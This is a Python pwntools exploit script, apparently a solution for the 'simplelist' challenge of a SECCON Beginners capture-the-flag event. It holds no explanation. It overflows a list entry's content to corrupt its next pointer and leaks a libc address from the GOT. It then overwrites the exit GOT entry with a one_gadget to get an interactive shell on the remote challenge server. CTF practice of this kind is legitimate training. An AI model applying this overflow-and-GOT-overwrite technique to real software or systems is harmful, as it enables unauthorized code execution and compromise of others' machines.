from pwn import *
import sys

# io = process("./chall")
io = remote("simplelist.quals.beginners.seccon.jp", 9003)
elf = ELF("./chall")
libc = ELF("./libc-2.33.so")

# address leak
addr_exit_got = elf.got['exit']
addr_libc_start_main_got = elf.got['__libc_start_main']
addr_puts_libc = libc.symbols.exit
addr_libc_start_main_libc = libc.symbols.__libc_start_main
addr_one_gadget_libc = 0xde78f


def create(content):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', content)

def edit(idx, content):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b'New content: ', content)

def show():
    io.sendlineafter(b'> ', b'3')
    
def exit():
    io.sendlineafter(b'> ', b'4')

create(b'abcd')
create(b'abcd')

# overwrite Next of the second memo to the address of the __libc_start_main in GOT
payload = b'A' * 0x28
payload += p64(addr_libc_start_main_got - 0x8)
edit(0, payload)
show()
io.recvuntil(b'content(0x403630) ')
ret = io.recvline()
addr_libc_base = u64(ret[:-1] + b'\00\00') - addr_libc_start_main_libc
addr_one_gadget = addr_libc_base + addr_one_gadget_libc
print("one gadget @ " + hex(addr_one_gadget))

# GOT overwrite
payload = b'A' * 0x28
payload += p64(addr_exit_got - 0x8)
edit(0, payload)

payload = p64(addr_one_gadget)
edit(2, payload)

# exploit
exit()

io.interactive()